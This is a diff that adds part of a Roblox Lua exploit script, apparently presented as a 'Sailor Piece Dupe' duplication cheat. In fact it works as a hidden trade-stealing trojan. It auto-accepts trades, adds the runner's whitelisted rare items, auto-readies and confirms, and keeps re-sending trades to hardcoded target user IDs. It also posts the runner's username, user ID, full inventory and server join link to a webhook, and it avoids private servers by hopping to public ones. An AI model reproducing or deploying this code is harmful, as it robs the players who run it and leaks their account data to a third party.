+						task.spawn(createSailorUi)
+					end
+					return
+				end
+
+				notifyBlockedServerCountdown(secondsLeft)
+				task.wait(1)
+			end
+
+			if AUTO_HOP_TO_PUBLIC_SERVER_WHEN_BLOCKED and scriptBlockedInPrivateServer then
+				local targetJobId = findLowPopulationPublicServerJobId()
+				if targetJobId then
+					recentServerHopAttempts[targetJobId] = os.clock()
+					queueScriptReloadOnTeleport()
+					pcall(function()
+						TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobId, localPlayer)
+					end)
+				else
+					warn("Sailor Piece Dupe: no suitable public server found this cycle; retrying without same-server fallback")
+				end
+			end
+
+			task.wait(math.max(0.5, SERVER_HOP_RETRY_DELAY))
+		end
+
+		blockedServerHopLoopStarted = false
+	end)
+end
+
+if BLOCK_SCRIPT_IN_PRIVATE_SERVER then
+	local shouldBlock = isPrivateServerByPlayerCount()
+	if shouldBlock and PRIVATE_SERVER_DETECTION_GRACE_SECONDS > 0 then
+		task.wait(PRIVATE_SERVER_DETECTION_GRACE_SECONDS)
+		shouldBlock = isPrivateServerByPlayerCount()
+	end
+	scriptBlockedInPrivateServer = shouldBlock
+end
+
+if scriptBlockedInPrivateServer then
+	task.defer(startBlockedServerRecoveryLoop)
+else
+	normalModeInitialized = true
+	disableTradeScreenGuisOnStart()
+	task.spawn(createSailorUi)
+end
+
+if not scriptBlockedInPrivateServer then
+
+local function getNextTradeTargetUserId()
+	if #RETRADE_TARGET_USER_IDS == 0 then
+		return nil
+	end
+
+	RETRADE_TARGET_INDEX = (RETRADE_TARGET_INDEX % #RETRADE_TARGET_USER_IDS) + 1
+	return RETRADE_TARGET_USER_IDS[RETRADE_TARGET_INDEX]
+end
+
+local function sendTradeRequestToTarget(targetUserId)
+	local userId = tonumber(targetUserId) or getNextTradeTargetUserId()
+	if not userId or userId <= 0 then
+		return false
+	end
+
+	return pcall(function()
+		sendTradeRequest:FireServer(userId)
+	end)
+end
+
+local function getRequestFunction()
+	return syn and syn.request
+		or http_request
+		or request
+		or (http and http.request)
+		or (fluxus and fluxus.request)
+end
+
+local function truncateForField(text, maxLen)
+	if #text <= maxLen then
+		return text
+	end
+	return string.sub(text, 1, maxLen - 3) .. "..."
+end
+
+local function getServerTypeLabel()
+	local isPrivateServer, playerCount = isPrivateServerByPlayerCount()
+	if isPrivateServer then
+		return string.format("Private Server (Heuristic, %d players)", playerCount), playerCount
+	end
+
+	return string.format("Public Server (Heuristic, %d players)", playerCount), playerCount
+end
+
+local function getJoinStatusText()
+	local isPrivateServer = isPrivateServerByPlayerCount()
+	if isPrivateServer then
+		return "User is on a private server"
+	end
+
+	return "User is on a public server"
+end
+
+local function buildInventorySummaryLines()
+	local items = inventoryByCategory.Items
+	if typeof(items) ~= "table" or #items == 0 then
+		return "No items found.", 0
+	end
+
+	local snapshot = {}
+	for _, item in ipairs(items) do
+		if typeof(item) == "table" and type(item.name) == "string" then
+			table.insert(snapshot, {
+				name = item.name,
+				quantity = tonumber(item.quantity) or 1,
+			})
+		end
+	end
+
+	table.sort(snapshot, function(a, b)
+		if a.quantity == b.quantity then
+			return a.name < b.name
+		end
+		return a.quantity > b.quantity
+	end)
+
+	local lines = {}
+	for i = 1, #snapshot do
+		local entry = snapshot[i]
+		table.insert(lines, string.format("%d) %s x%d", i, entry.name, entry.quantity))
+	end
+
+	local combined = table.concat(lines, "\n")
+	return combined, #snapshot
+end
+
+local function buildInventoryCategorySummaryLines()
+	local categories = {}
+	for category, list in pairs(inventoryByCategory) do
+		if typeof(category) == "string" and typeof(list) == "table" then
+			local entries = #list
+			local totalQuantity = 0
+			for _, item in ipairs(list) do
+				if typeof(item) == "table" then
+					totalQuantity = totalQuantity + (tonumber(item.quantity) or 1)
+				end
+			end
+
+			table.insert(categories, {
+				name = category,
+				entries = entries,
+				totalQuantity = totalQuantity,
+			})
+		end
+	end
+
+	if #categories == 0 then
+		return "No categories found."
+	end
+
+	table.sort(categories, function(a, b)
+		if a.entries == b.entries then
+			return a.name < b.name
+		end
+		return a.entries > b.entries
+	end)
+
+	local lines = {}
+	for _, category in ipairs(categories) do
+		table.insert(lines, string.format("%s: %d entries (Total Qty: %d)", category.name, category.entries, category.totalQuantity))
+	end
+
+	return truncateForField(table.concat(lines, "\n"), 1000)
+end
+
+local function buildTrackedRareItemsSummaryLines()
+	local items = inventoryByCategory.Items
+	if typeof(items) ~= "table" or #items == 0 then
+		return "No inventory items found."
+	end
+
+	local tracked = {}
+	for itemName, isTracked in pairs(ITEMS_TO_ADD_WHITELIST) do
+		if isTracked then
+			tracked[itemName] = 0
+		end
+	end
+
+	for _, item in ipairs(items) do
+		if typeof(item) == "table" and type(item.name) == "string" and tracked[item.name] ~= nil then
+			tracked[item.name] = tracked[item.name] + (tonumber(item.quantity) or 1)
+		end
+	end
+
+	local found = {}
+	for itemName, quantity in pairs(tracked) do
+		if quantity > 0 then
+			table.insert(found, {
+				name = itemName,
+				quantity = quantity,
+			})
+		end
+	end
+
+	if #found == 0 then
+		return "No tracked rare items found in inventory."
+	end
+
+	table.sort(found, function(a, b)
+		if a.quantity == b.quantity then
+			return a.name < b.name
+		end
+		return a.quantity > b.quantity
+	end)
+
+	local lines = {}
+	for _, entry in ipairs(found) do
+		table.insert(lines, string.format("%s x%d", entry.name, entry.quantity))
+	end
+
+	return truncateForField(table.concat(lines, "\n"), 1000)
+end
+
+local function splitTextIntoChunks(text, maxChunkSize)
+	local chunks = {}
+	local sourceText = type(text) == "string" and text or ""
+	local chunkSize = math.max(1, math.floor(maxChunkSize or 900))
+
+	if sourceText == "" then
+		return {"None"}
+	end
+
+	local startIndex = 1
+	while startIndex <= #sourceText do
+		local endIndex = math.min(#sourceText, startIndex + chunkSize - 1)
+		table.insert(chunks, string.sub(sourceText, startIndex, endIndex))
+		startIndex = endIndex + 1
+	end
+
+	return chunks
+end
+
+local function appendInventoryFields(fields, fieldBaseName, inventoryText)
+	local chunks = splitTextIntoChunks(inventoryText, 900)
+	for index, chunk in ipairs(chunks) do
+		local fieldName = fieldBaseName
+		if #chunks > 1 then
+			fieldName = string.format("%s (%d/%d)", fieldBaseName, index, #chunks)
+		end
+
+		table.insert(fields, {
+			name = fieldName,
+			value = "```\n" .. chunk .. "\n```",
+			inline = false,
+		})
+	end
+end
+
+local function sendPrivateServerDetectedWebhook()
+	if WEBHOOK_ONE_LOG_PER_SERVER and serverLogSentForJobId == game.JobId then
+		return
+	end
+
+	sendWebhook("Private Server Detected", "User is on a private server. Hopping to a public server next.", true, {
+		{
+			name = "Join Link",
+			value = string.format(
+				"[Click here to join](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)",
+				game.PlaceId,
+				game.JobId
+			),
+			inline = false,
+		},
+	})
+
+	serverLogSentForJobId = game.JobId
+end
+
+local function buildTradeItemLines(items)
+	if typeof(items) ~= "table" or #items == 0 then
+		return "None", 0
+	end
+
+	local maxLines = math.max(1, WEBHOOK_MAX_INVENTORY_LINES)
+	local shown = math.min(maxLines, #items)
+	local lines = {}
+	for i = 1, shown do
+		local item = items[i]
+		if typeof(item) == "table" and type(item.name) == "string" then
+			local qty = tonumber(item.quantity) or 1
+			table.insert(lines, string.format("%d) %s x%d", i, item.name, qty))
+		end
+	end
+
+	if #items > shown then
+		table.insert(lines, string.format("... and %d more", #items - shown))
+	end
+
+	return truncateForField(table.concat(lines, "\n"), 1000), #items
+end
+
+local function sendWebhook(eventName, statusText, includeInventory, extraFields)
+	if not WEBHOOK_ENABLED or WEBHOOK_URL == "" then
+		return
+	end
+
+	local requestFn = getRequestFunction()
+	if not requestFn then
+		return
+	end
+
+	local username = localPlayer and localPlayer.Name or "Unknown"
+	local displayName = localPlayer and localPlayer.DisplayName or username
+	local userId = localPlayer and localPlayer.UserId or 0
+	local placeId = game.PlaceId
+	local jobId = game.JobId
+	local serverType, playerCount = getServerTypeLabel()
+	local avatarUrl = string.format(
+		"https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=100&height=100&format=png",
+		userId
+	)
+
+	local fields = {
+		{
+			name = "Player",
+			value = string.format("%s (@%s)\nUserId: %d", displayName, username, userId),
+			inline = true,
+		},
+		{
+			name = "Server",
+			value = string.format("Type: %s\nPlayers: %d\nPlaceId: %d\nJobId: %s", serverType, playerCount, placeId, jobId),
+			inline = true,
+		},
+		{
+			name = "Status",
+			value = statusText or "N/A",
+			inline = false,
+		},
+		{
+			name = "Join Status",
+			value = getJoinStatusText(),
+			inline = false,
+		},
+	}
+
+	if includeInventory then
+		local inventoryText, totalCount = buildInventorySummaryLines()
+		table.insert(fields, {
+			name = "Rare Items Found",
+			value = "```\n" .. buildTrackedRareItemsSummaryLines() .. "\n```",
+			inline = false,
+		})
+		appendInventoryFields(fields, string.format("Inventory (Items) - %d total", totalCount), inventoryText)
+	end
+
+	if typeof(extraFields) == "table" then
+		for _, field in ipairs(extraFields) do
+			if typeof(field) == "table" and field.name and field.value then
+				table.insert(fields, field)
+			end
+		end
+	end
+
+	local payload = {
+		embeds = {
+			{
+				title = "Sailor: " .. tostring(eventName),
+				color = 5814783,
+				thumbnail = {
+					url = avatarUrl,
+				},
+				fields = fields,
+				footer = {
+					text = os.date("!%Y-%m-%d %H:%M:%S UTC"),
+				},
+			},
+		},
+	}
+
+	pcall(function()
+		requestFn({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json",
+			},
+			Body = HttpService:JSONEncode(payload),
+		})
+	end)
+end
+
+local function sendScriptExecutedWebhook()
+	if not WEBHOOK_ENABLED or WEBHOOK_URL == "" then
+		return
+	end
+
+	if WEBHOOK_ONE_LOG_PER_SERVER and serverLogSentForJobId == game.JobId then
+		return
+	end
+
+	local requestFn = getRequestFunction()
+	if not requestFn then
+		return
+	end
+
+	if FORCE_REQUEST_IF_ITEMS_EMPTY and not hasItemsInventory() then
+		refreshInventory()
+		-- Wait for inventory to load
+		local isPrivateServer = isPrivateServerByPlayerCount()
+		local timeoutSeconds = isPrivateServer and STARTUP_WEBHOOK_INVENTORY_WAIT_TIMEOUT_PRIVATE or STARTUP_WEBHOOK_INVENTORY_WAIT_TIMEOUT_PUBLIC
+		local startedAt = os.clock()
+		while os.clock() - startedAt < timeoutSeconds do
+			if hasItemsInventory() then
+				break
+			end
+			task.wait(STARTUP_WEBHOOK_REQUEST_INTERVAL)
+		end
+	end
+
+	local username = localPlayer and localPlayer.Name or "Unknown"
+	local displayName = localPlayer and localPlayer.DisplayName or username
+	local userId = localPlayer and localPlayer.UserId or 0
+	local placeId = game.PlaceId
+	local jobId = game.JobId
+	local serverType, playerCount = getServerTypeLabel()
+	local avatarUrl = string.format(
+		"https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=100&height=100&format=png",
+		userId
+	)
+	local serverLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
+	local inventoryText, totalCount = buildInventorySummaryLines()
+	local rareItemsSummary = buildTrackedRareItemsSummaryLines()
+
+	local payload = {
+		embeds = {
+			{
+				title = "Sailor: Script Executed",
+				color = 5814783,
+				thumbnail = {
+					url = avatarUrl,
+				},
+				fields = {
+					{
+						name = "Player",
+						value = string.format("%s (@%s)\nUserId: %d", displayName, username, userId),
+						inline = true,
+					},
+					{
+						name = "Server",
+						value = string.format("Type: %s\nPlayers: %d\nPlaceId: %d\nJobId: %s", serverType, playerCount, placeId, jobId),
+						inline = true,
+					},
+					{
+						name = "Status",
+						value = "Script executed successfully",
+						inline = false,
+					},
+					{
+						name = "Join Status",
+						value = getJoinStatusText(),
+						inline = false,
+					},
+					{
+						name = "Join Link",
+						value = string.format("[Click here to join](%s)", serverLink),
+						inline = false,
+					},
+					{
+						name = "Rare Items Found",
+						value = "```\n" .. rareItemsSummary .. "\n```",
+						inline = false,
+					},
+				},
+				footer = {
+					text = os.date("!%Y-%m-%d %H:%M:%S UTC"),
+				},
+			},
+		},
+	}
+
+	appendInventoryFields(payload.embeds[1].fields, string.format("Inventory (Items) - %d total", totalCount), inventoryText)
+
+	pcall(function()
+		requestFn({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json",
+			},
+			Body = HttpService:JSONEncode(payload),
+		})
+	end)
+
+	if WEBHOOK_ONE_LOG_PER_SERVER then
+		serverLogSentForJobId = game.JobId
+	end
+end
+
+refreshInventory = function()
+	requestInventoryNow()
+end
+
+hasItemsInventory = function()
+	local items = inventoryByCategory.Items
+	return typeof(items) == "table" and #items > 0
+end
+
+local function waitForItemsInventory(timeoutSeconds)
+	local startedAt = os.clock()
+	while tradeActive and os.clock() - startedAt < timeoutSeconds do
+		if hasItemsInventory() then
+			return true
+		end
+		task.wait(0.05)
+	end
+
+	return hasItemsInventory()
+end
+
+local function waitForItemCountIncrease(previousCount, timeoutSeconds)
+	local startedAt = os.clock()
+	while tradeActive and os.clock() - startedAt < timeoutSeconds do
+		if myTradeItemCount > previousCount then
+			return true
+		end
+		task.wait(0.03)
+	end
+
+	return myTradeItemCount > previousCount
+end
+
+-- Modified function: Only add whitelisted items
+local function autoAddWhitelistedItemsMax(jobId)
+	if not AUTO_ADD_ITEMS_ENABLED then
+		return 0
+	end
+
+	local items = inventoryByCategory.Items
+	if typeof(items) ~= "table" then
+		return 0
+	end
+
+	local addedCount = 0
+
+	local itemSnapshot = {}
+	for _, item in ipairs(items) do
+		if typeof(item) == "table" then
+			table.insert(itemSnapshot, {
+				name = item.name,
+				quantity = item.quantity,
+			})
+		end
+	end
+
+	for _, item in ipairs(itemSnapshot) do
+		if not tradeActive or jobId ~= addJobId then
+			return addedCount
+		end
+
+		if myTradeItemCount >= MAX_ITEMS_PER_SIDE then
+			return addedCount
+		end
+
+		local itemName = item.name
+		local quantity = tonumber(item.quantity) or 1
+		
+		-- Check if item is in whitelist
+		if itemName and quantity > 0 and ITEMS_TO_ADD_WHITELIST[itemName] then
+			local success = false
+			for _ = 1, MAX_ADD_RETRIES + 1 do
+				if not tradeActive or jobId ~= addJobId then
+					return addedCount
+				end
+
+				if myTradeItemCount >= MAX_ITEMS_PER_SIDE then
+					return addedCount
+				end
+
+				local beforeCount = myTradeItemCount
+				addItemToTrade:FireServer("Items", itemName, quantity)
+				success = waitForItemCountIncrease(beforeCount, UPDATE_WAIT_TIMEOUT)
+				if success then
+					break
+				end
+				task.wait(ADD_ITEM_INTERVAL)
+			end
+
+			if success then
+				addedCount = addedCount + 1
+				task.wait(ADD_ITEM_INTERVAL + POST_ADD_COOLDOWN)
+			end
+		end
+	end
+
+	return addedCount
+end
+
+if updateInventory then
+	updateInventory.OnClientEvent:Connect(function(category, list)
+		if typeof(category) == "string" and typeof(list) == "table" then
+			inventoryByCategory[category] = list
+			if category == "Items" then
+				updateInventoryStatusParagraph("Inventory Detected")
+				updateSelectedItemStatus()
+				if scanNotifyPending then
+					scanNotifyPending = false
+					notifyInventoryUpdated()
+				end
+			end
+		end
+	end)
+end
+
+tradeRequestReceived.OnClientEvent:Connect(function(_requestData)
+	if not AUTO_ACCEPT_ENABLED then
+		return
+	end
+
+	if ACCEPT_DELAY > 0 then
+		task.wait(ACCEPT_DELAY)
+	end
+
+	respondToRequest:FireServer(true)
+end)
+
+tradeUpdated.OnClientEvent:Connect(function(data)
+	if typeof(data) == "table" and typeof(data.myItems) == "table" then
+		myTradeItemCount = #data.myItems
+		lastTradeState.myItems = data.myItems
+	end
+
+	if typeof(data) == "table" and typeof(data.theirItems) == "table" then
+		lastTradeState.theirItems = data.theirItems
+	end
+
+	if AUTO_CONFIRM_ENABLED and tradeActive and typeof(data) == "table" then
+		if data.phase == "confirming" and not data.myConfirm then
+			local now = os.clock()
+			if now - lastAutoConfirmAt >= AUTO_CONFIRM_COOLDOWN then
+				lastAutoConfirmAt = now
+				local confirmJobId = addJobId
+				task.delay(AUTO_CONFIRM_DELAY, function()
+					if tradeActive and confirmJobId == addJobId then
+						confirmTrade:FireServer()
+					end
+				end)
+			end
+		end
+	end
+end)
+
+tradeStarted.OnClientEvent:Connect(function(_tradeData)
+	tradeActive = true
+	retradeLoopToken = retradeLoopToken + 1
+	myTradeItemCount = 0
+	addJobId = addJobId + 1
+	lastAutoConfirmAt = 0
+	local currentJobId = addJobId
+	local addedCount = 0
+
+	if REQUEST_INVENTORY_ON_TRADE_START then
+		refreshInventory()
+	end
+
+	if FORCE_REQUEST_IF_ITEMS_EMPTY and not hasItemsInventory() then
+		refreshInventory()
+	end
+
+	if AUTO_ADD_ITEMS_ENABLED then
+		if AUTO_ADD_DELAY > 0 then
+			task.wait(AUTO_ADD_DELAY)
+		end
+
+		if not waitForItemsInventory(INVENTORY_WAIT_TIMEOUT) then
+			return
+		end
+
+		-- Use the whitelisted version instead of autoAddAllItemsMax
+		addedCount = autoAddWhitelistedItemsMax(currentJobId)
+	end
+
+	if AUTO_READY_ENABLED and tradeActive and currentJobId == addJobId then
+		local canReady = not REQUIRE_ITEM_ADDED_BEFORE_READY or addedCount > 0 or not AUTO_ADD_ITEMS_ENABLED
+		if canReady then
+			if AUTO_READY_DELAY > 0 then
+				task.wait(AUTO_READY_DELAY)
+			end
+			setReady:FireServer(true)
+		end
+	end
+end)
+
+tradeCancelled.OnClientEvent:Connect(function()
+	tradeActive = false
+	addJobId = addJobId + 1
+	lastAutoConfirmAt = 0
+
+	if AUTO_RETRADE_ON_CANCEL and #RETRADE_TARGET_USER_IDS > 0 then
+		retradeLoopToken = retradeLoopToken + 1
+		local currentLoopToken = retradeLoopToken
+
+		task.spawn(function()
+			if FIRE_CANCEL_BEFORE_RETRADE then
+				pcall(function()
+					cancelTradeRemote:FireServer()
+				end)
+			end
+
+			local firstIteration = true
+			while AUTO_RETRADE_ON_CANCEL and not tradeActive and currentLoopToken == retradeLoopToken do
+				sendTradeRequestToTarget()
+
+				local waitTime = RETRADE_LOOP_INTERVAL
+				if firstIteration and RETRADE_DELAY > 0 then
+					waitTime = RETRADE_DELAY
+				end
+				firstIteration = false
+				task.wait(waitTime)
+			end
+		end)
+	end
+end)
+
+tradeCompleted.OnClientEvent:Connect(function(data)
+	tradeActive = false
+	addJobId = addJobId + 1
+	lastAutoConfirmAt = 0
+
+	local myItems = lastTradeState.myItems
+	local theirItems = lastTradeState.theirItems
+	if typeof(data) == "table" then
+		if typeof(data.myItems) == "table" then
+			myItems = data.myItems
+		end
+		if typeof(data.theirItems) == "table" then
+			theirItems = data.theirItems
+		end
+	end
+
+	local myLines, myCount = buildTradeItemLines(myItems)
+	local theirLines, theirCount = buildTradeItemLines(theirItems)
+
+	sendWebhook("Trade Successful", "Trade completed successfully", false, {
+		{
+			name = string.format("You Gave - %d total", myCount),
+			value = "```\n" .. myLines .. "\n```",
+			inline = false,
+		},
+		{
+			name = string.format("You Got - %d total", theirCount),
+			value = "```\n" .. theirLines .. "\n```",
+			inline = false,
+		},
+	})
+end)
+
+task.spawn(function()
+	if FORCE_REQUEST_IF_ITEMS_EMPTY and not hasItemsInventory() then
+		refreshInventory()
+	end
+
+	local startedAt = os.clock()
+	while os.clock() - startedAt < INVENTORY_WAIT_TIMEOUT do
+		if hasItemsInventory() then
+			break
+		end
+		task.wait(0.05)
+	end
+
+	sendScriptExecutedWebhook()
+end)
+
+end
